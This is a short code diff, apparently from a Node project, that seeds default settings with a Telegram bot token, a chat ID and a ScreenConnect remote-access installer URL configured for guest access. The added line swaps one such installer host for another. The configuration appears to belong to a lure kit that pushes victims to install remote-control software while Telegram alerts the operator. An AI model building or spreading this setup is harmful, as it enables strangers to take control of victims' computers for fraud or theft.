@@ -27,7 +27,7 @@ if (!initialSettings) {
   `).run(
     process.env.TELEGRAM_BOT_TOKEN || "",
     process.env.TELEGRAM_CHAT_ID || "",
-    "https://professionalgfx.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
+    "https://almarabeaunited2.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
   );
 }
 
